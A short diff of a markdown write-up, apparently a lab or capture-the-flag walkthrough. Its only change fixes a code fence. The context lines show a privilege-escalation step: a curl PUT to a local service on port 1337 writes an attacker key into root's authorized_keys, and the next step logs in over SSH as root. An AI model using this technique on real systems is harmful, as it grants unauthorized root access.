@@ -60,4 +60,4 @@ curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat /tmp/root_
 SSH as Root
 ```bash
 ssh -i /tmp/root_key root@localhost
-```bash
+```
